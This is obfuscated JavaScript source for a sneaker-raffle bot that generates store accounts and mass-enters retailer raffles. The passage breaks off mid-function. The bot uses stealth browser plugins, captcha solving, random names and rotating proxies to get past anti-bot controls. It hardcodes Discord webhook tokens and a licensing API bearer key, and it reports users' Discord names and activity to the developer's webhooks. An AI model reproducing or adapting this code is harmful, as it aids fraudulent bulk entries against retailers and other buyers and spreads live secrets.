const { EmbedBuilder: _0x9c6665 } = require('discord.js');
var _0x54f98b = require('exe');
const { execFile: _0x373613 } = require('child_process'), _0x3d4a9f = require('puppeteer-extra'), _0x484dec = require('puppeteer-extra-plugin-recaptcha'), _0x42d8ce = require('puppeteer-extra-plugin-stealth'), _0xeca352 = require('chalk'), _0x4dc5fe = require('node-bash-title'), _0x1da89f = require('fs'), _0x3d1eb1 = require('axios'), _0x426a73 = require('papaparse');
var _0x145f8e = require('random-name');
const _0x1b3ad6 = require('request');
var _0x2086bb = require('prompt');
const _0x3850c3 = _0x1b3ad6['jar']();
var _0x202e3d = {};
const _0x2ff2d5 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x34def1 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x15b5a4 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x46bf75 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4025e3 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x431c7a = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0xe9a3fd = 'https://discord.com/api/webhooks/', _0xcb3fb = '' + _0xe9a3fd + _0x15b5a4, _0x16cb69 = '' + _0xe9a3fd + _0x46bf75, _0x16dc96 = '' + _0xe9a3fd + _0x2ff2d5, _0x3df8e6 = '' + _0xe9a3fd + _0x34def1, _0x146b83 = '' + _0xe9a3fd + _0x4025e3, _0x31745a = '' + _0xe9a3fd + _0x431c7a;
const _0x3682f3 = JSON['parse'](_0x1da89f['readFileSync']('../package.json', 'utf-8')), _0x49eea2 = _0x3682f3['version'];
var _0x3733f2, _0xc68ec8, _0x34e038, _0x21e2c2, _0x2a4a0a, _0x2654a4, _0x1b651e, _0x2051b6;
const _0x1787dc = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x55763a = ![];
const _0x435502 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x149fda = '0123456789';
var _0x313d1f = _0x435502['split']('');
const _0x4b2545 = require('auto-git-update'), { PageEmittedEvents: _0x166565 } = require('puppeteer'), { getRandomValues: _0x629a9e } = require('crypto'), { resolve: _0x19e6cb } = require('path'), { Console: _0xce6745 } = require('console'), _0x4b6914 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x500ee3 = new _0x4b2545(_0x4b6914);
async function _0x3fb0dd() {
    _0x2a4a0a = _0x1da89f['readdirSync']('../proxies'), _0x21e2c2 = _0x1da89f['readdirSync']('../tasks'), _0x202e3d = JSON['parse'](_0x1da89f['readFileSync']('../settings.json', 'utf-8')), !_0x202e3d['delay'] && (_0x202e3d['delay'] = 0x2710, _0x1da89f['writeFileSync']('../settings.json', JSON['stringify'](_0x202e3d))), !_0x202e3d['captchaKey'] && (_0x202e3d['captchaKey'] = '', _0x1da89f['writeFileSync']('../settings.json', JSON['stringify'](_0x202e3d))), !_0x202e3d['useRandomProxy'] && (_0x202e3d['useRandomProxy'] = !![], _0x1da89f['writeFileSync']('../settings.json', JSON['stringify'](_0x202e3d))), !_0x202e3d['webhook'] && (_0x202e3d['webhook'] = '', _0x1da89f['writeFileSync']('../settings.json', JSON['stringify'](_0x202e3d))), _0x202e3d['MahaDelay'] = _0x202e3d['delay'], _0xe9a3fd = _0x202e3d['webhook'], _0x2654a4 = _0x202e3d['licenseKey'];
}
let _0x1057af, _0x18b0e6 = [], _0x265a7e;
const _0x1f4682 = _0x41aba2 => new Promise(_0x31838b => setTimeout(_0x31838b, _0x41aba2));
function _0x165739(_0x2946d5, _0x1f6084) {
    return Math['floor'](Math['random']() * (_0x1f6084 - _0x2946d5 + 0x1) + _0x2946d5);
}
async function _0x3997af(_0x22a020) {
    return _0x3d1eb1['get']('https://api.hyper.co/v4/licenses/' + _0x22a020, { 'headers': { 'Authorization': 'Bearer\x20' + _0x1787dc } })['then'](_0x157ab6 => _0x157ab6['data'])['catch'](() => null);
}
;
async function _0x4477ba(_0x2bd4f6) {
    console['clear']();
    if (_0x2bd4f6 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x31866d = await _0x2086bb['get']('License');
        if (_0x31866d['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x1f4682(0xbb8), _0x4477ba(_0x2bd4f6);
        _0x2bd4f6 = _0x31866d['License'], _0x202e3d['licenseKey'] = _0x2bd4f6, _0x2654a4 = _0x2bd4f6, _0x1da89f['writeFileSync']('../settings.json', JSON['stringify'](_0x202e3d));
    }
    console['log']('Checking\x20license\x20' + _0x2654a4 + '...'), await _0x1f4682(0x320);
    const _0x301d77 = await _0x3997af(_0x2bd4f6);
    _0x1b651e = JSON['stringify'](_0x301d77['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x2051b6 = JSON['stringify'](_0x301d77['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x301d77)
        return console['log']('License\x20not\x20found');
    if (!_0x301d77['user'])
        return console['log']('License\x20not\x20bound');
    return _0x301d77['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x55763a = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x55763a = ![]);
}
async function _0x31a93b() {
    var _0x18f638 = await _0x2086bb['get']('Module');
    return console['clear'](), _0x18f638['Module'];
}
;
async function _0x2bcce7() {
    var _0x404ecc = await _0x2086bb['get']('Setting');
    return console['clear'](), _0x404ecc['Setting'];
}
async function _0x196a62() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x347ca9 = 0x0; _0x347ca9 < _0x21e2c2['length']; _0x347ca9++) {
        console['log']('\x20(' + _0x347ca9 + ')\x20' + _0x21e2c2[_0x347ca9]);
    }
    console['log']('');
    var _0x36fc7a = await _0x2086bb['get']('Task');
    if (_0x36fc7a['Task'] > _0x21e2c2['length'] - 0x1 || isNaN(_0x36fc7a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1f4682(0x3e8), _0x196a62();
    var _0x6edcae = _0x1da89f['readFileSync']('../tasks/' + _0x21e2c2[_0x36fc7a['Task']], 'utf-8');
    return _0x34e038 = _0x426a73['parse'](_0x6edcae, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0xeca352['blue'](_0x21e2c2[_0x36fc7a['Task']])), _0x3733f2 = _0x21e2c2[_0x36fc7a['Task']], _0x34e038;
}
async function _0x4d53e1() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x587aa6 = 0x0; _0x587aa6 < _0x2a4a0a['length']; _0x587aa6++) {
        console['log']('\x20(' + _0x587aa6 + ')\x20' + _0x2a4a0a[_0x587aa6]);
    }
    console['log']('');
    var _0x36dd2a = await _0x2086bb['get']('Proxies');
    if (_0x36dd2a['Proxies'] > _0x2a4a0a['length'] - 0x1 || isNaN(_0x36dd2a['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1f4682(0x3e8), _0x4d53e1();
    var _0x1bfb48 = _0x1da89f['readFileSync']('../proxies/' + _0x2a4a0a[_0x36dd2a['Proxies']], 'utf-8')['split']('\x0a');
    let _0x4d1894 = _0x1bfb48['map']((_0x57970f, _0x1f1166) => {
        sanatizeProxy = _0x57970f['replace']('\x0d', '');
        if (_0x1bfb48[_0x1f1166 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0xc68ec8 = _0x2a4a0a[_0x36dd2a['Proxies']], console['clear'](), _0x4d1894;
}
async function _0x3ddf72() {
    var _0x4942b5 = await _0x2086bb['get']('Value');
    return console['clear'](), _0x4942b5['Value'];
}
async function _0x56512e(_0x509026) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x43ece9 = 0x0; _0x43ece9 < _0x509026['length']; _0x43ece9++) {
        console['log']('\x20(' + _0x43ece9 + ')\x20[' + _0x509026[_0x43ece9]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x2771e6 = await _0x2086bb['get']('Module');
    return _0x2771e6['Module'];
}
async function _0x559a03() {
    var _0x572b2b = await _0x2086bb['get']('Password');
    return console['clear'](), _0x572b2b['Password'];
}
;
async function _0x5654cd() {
    var _0x226792 = await _0x2086bb['get']('Links');
    return _0x226792['Links'];
}
;
async function _0xce8d75() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0xbacf7 = 0x0; _0xbacf7 < _0x18b0e6['length']; _0xbacf7++) {
        console['log']('\x20(' + _0xbacf7 + ')\x20' + _0x18b0e6[_0xbacf7]);
    }
    ;
    console['log']();
    let _0x2fb797 = await _0x2086bb['get']('Product');
    return console['clear'](), _0x2fb797['Product'];
}
;
function _0x3a3ee9() {
    var _0x5ac314 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x5ac314;
}
;
const _0x1b0085 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'WdVw7N',
                            'custom_source': 'DV3742-021',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'S8GH2D',
                                '$consent_form_version': 0x7d9216,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x10557a(_0x3c82e5, _0x50cef3) {
    let _0x553844 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x49eea2 != 'devkey') {
        await _0x3d1eb1['post'](_0x3c82e5, _0x50cef3, _0x553844);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x2221dc(_0x516e01, _0x1db7c8, _0x322e1e, _0x28063c, _0x4bb838) {
    if (!_0x28063c && _0x322e1e == 'dev') {
        var _0x39a5a0 = new _0x9c6665()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x1db7c8['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x1db7c8['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x516e01['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x202e3d['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x1b651e,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x516e01['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x49eea2,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x39a5a0['data'];
    } else {
        if (_0x28063c && _0x322e1e == 'dev') {
            var _0x39a5a0 = new _0x9c6665()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x1db7c8['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x1b651e,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x1db7c8['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x516e01['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x202e3d['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x4bb838,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x516e01['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x49eea2,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x39a5a0['data'];
        } else {
            if (_0x322e1e == 'pub') {
                var _0x39a5a0 = new _0x9c6665()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x1db7c8['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x1db7c8['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x516e01['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x516e01['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x49eea2,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x39a5a0['data'];
            } else {
                if (_0x322e1e == 'acc' && !_0x28063c) {
                    var _0x39a5a0 = new _0x9c6665()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x1db7c8['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x1b651e,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x1db7c8['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x202e3d['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x49eea2,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x39a5a0['data'];
                } else {
                    if (_0x322e1e == 'acc' && _0x28063c) {
                        var _0x39a5a0 = new _0x9c6665()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x1db7c8['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x1b651e,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x4bb838,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x1db7c8['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x202e3d['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x49eea2,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x39a5a0['data'];
                    } else {
                        if (_0x322e1e == 'open') {
                            var _0x39a5a0 = new _0x9c6665()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x2051b6)['addFields']({
                                'name': 'User',
                                'value': '' + _0x1b651e,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x49eea2,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x39a5a0['data'];
                        } else {
                            if (!_0x28063c && _0x322e1e == 'ver') {
                                var _0x39a5a0 = new _0x9c6665()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x1db7c8['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x1b651e,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x1db7c8['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x202e3d['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x49eea2,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x39a5a0['data'];
                            } else {
                                if (_0x28063c && _0x322e1e == 'ver') {
                                    var _0x39a5a0 = new _0x9c6665()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x1db7c8['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x1b651e,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x4bb838,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x1db7c8['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
